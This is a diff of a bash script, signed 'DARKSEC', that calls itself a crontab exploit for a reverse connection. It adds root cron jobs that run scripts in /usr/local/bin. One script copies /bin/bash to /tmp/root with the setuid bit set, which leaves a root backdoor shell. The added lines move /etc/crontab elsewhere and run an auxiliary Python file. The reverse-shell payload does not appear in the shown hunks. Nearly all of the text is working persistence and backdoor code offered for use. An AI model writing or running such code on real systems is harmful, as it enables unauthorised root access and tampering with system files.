@@ -2,7 +2,9 @@
 # DEVELOPER DARKSEC
 # THIS SCRIPT IS FOR A EXPLOIT FROM CRONTAB, SO WE WILL GET A REVERSE CONNECTION, WITH CRONTAB!
 # on the ip and port, choice the type from payload or connection reverse.
+# CREATE IN 2023 BY DARKSEC
 
+darksec="$PWD"
 
 echo "*******|-NEED RUN WITH ROOT!-|******"
 echo "HELLO FRIEND, HOW ARE YOU?"
@@ -14,16 +16,16 @@ read senso_de_humor
 echo "==========================="
 case $senso_de_humor in
 "1")
-	echo ":)"
+        echo ":)"
 ;;
 "2")
-	echo ":/"
+        echo ":/"
 esac
 echo "==========================="
 echo "wait 1 minute..."
 sed -i -e '$i\* * * * * root system.sh' /etc/crontab
 sed -i -e '$i\* * * * * root root.sh' /etc/crontab
-sleep 1
+sleep 5
 cd /usr/local/bin
 sleep 1
 touch system.sh
@@ -36,6 +38,15 @@ touch root.sh
 chmod +x /usr/local/bin/root.sh
 echo "#\!/bin/bash" > /usr/local/bin/root.sh
 echo "cp /bin/bash /tmp/root && chmod +xs /tmp/root" >> /usr/local/bin/root.sh
+sleep 1
+cd /etc/
+mkdir darksec
+sleep 1
+mv /etc/crontab /etc/darksec/crontab
+sleep 1
+cd "$darksec"
+sleep 1
+python3 auxiliary.py
 sleep 1
 echo "wait..."
 sleep 3
